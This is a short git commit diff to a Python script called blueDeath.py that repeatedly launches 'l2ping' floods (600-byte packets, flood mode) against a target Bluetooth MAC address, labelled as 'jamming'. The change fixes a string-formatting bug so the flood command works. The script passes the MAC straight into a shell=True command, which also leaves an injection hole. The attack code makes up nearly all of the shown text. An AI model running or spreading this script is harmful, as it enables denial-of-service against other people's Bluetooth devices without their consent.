301569c38892e1b3fdf9712781abb71ea7c54dd9
void <fluffy.siberian.cat@gmail.com>
2023-04-28 08:18:24 +1000

    pre-release

--- blueDeath.py
+++ blueDeath.py
@@ -17,7 +17,7 @@ print("Start jamming...")
 delay = int(time)
 
 while delay != 0:
-    xterm_1 = "timeout 1s l2ping -i hci0 -s 600 -f %s &" % (time, mac)
+    xterm_1 = "timeout 1s l2ping -i hci0 -s 600 -f %s &" % (mac)
     subprocess.Popen(xterm_1, stdout=subprocess.PIPE, stderr=subprocess.PIPE,shell=True)
     delay -= 1
 
